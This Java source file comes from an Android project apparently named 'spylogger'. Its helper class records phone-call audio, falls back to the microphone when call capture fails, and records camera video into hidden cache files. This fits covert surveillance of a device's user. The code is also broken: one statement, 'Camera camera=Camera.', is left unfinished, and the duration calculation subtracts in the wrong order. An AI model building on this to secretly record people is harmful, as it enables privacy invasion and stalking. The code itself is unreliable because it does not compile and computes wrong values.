package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;

import java.io.File;
import java.io.IOException;
import java.util.Date;

/**
 * Created by bruno on 20/11/16.
 */

public class MediaRecorderHelper implements MediaRecorder.OnInfoListener{
    private Context context;
    private MediaRecorder recorder;
    private File recordFile;
    private boolean ligacao;
    private int maxDuration;
    private boolean recording;
    private long duration;
    private Date inicio;
    private TaskComplete callback;


    public MediaRecorderHelper(Context context,boolean ligacao,int maxDuration) throws IOException {
        this.context = context;
        this.ligacao=ligacao;
        this.maxDuration=maxDuration*1000;

        prepareAudio();

    }

    private void prepareAudio() throws IOException {
        recordFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        if(ligacao) {
            try {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();

            } catch (IOException e) {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();
            }
        }else{
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(recordFile.getAbsolutePath());
            recorder.setMaxDuration(maxDuration);
            recorder.setOnInfoListener(this);

            recorder.prepare();
        }


        recording=false;
    }

    private void prepareVideo() throws IOException {
        recordFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        Camera camera=Camera.

        recorder = new MediaRecorder();
        recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));

        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);

        recorder.setVideoFrameRate(15);
        recorder.setOutputFile(recordFile.getAbsolutePath());
        recorder.setMaxDuration(maxDuration>30000?30000:maxDuration);
        recorder.setOnInfoListener(this);

        recorder.prepare();
    }

    public void start() throws IOException {
        if(recorder!=null) {
            recorder.start();
        }else{
            prepareAudio();
            start();
        }
        duration=0;
        inicio=new Date();
        recording=true;
    }
    public void stop(){
        if(recorder!=null){
            recorder.stop();
            recorder.release();
            recorder=null;
        }
        duration=((inicio.getTime() - (new Date()).getTime()) / 1000);
        recording=false;
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if(callback!=null){
            callback.onFinish(null);
        }
    }

    @Override
    public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
            stop();
        }
    }

    public void setCallback(TaskComplete callback) {
        this.callback = callback;
    }

    public long getDuration() {
        return duration;
    }

    public File getRecordFile() {
        return recordFile;
    }


    public boolean isRecording() {
        return recording;
    }
}
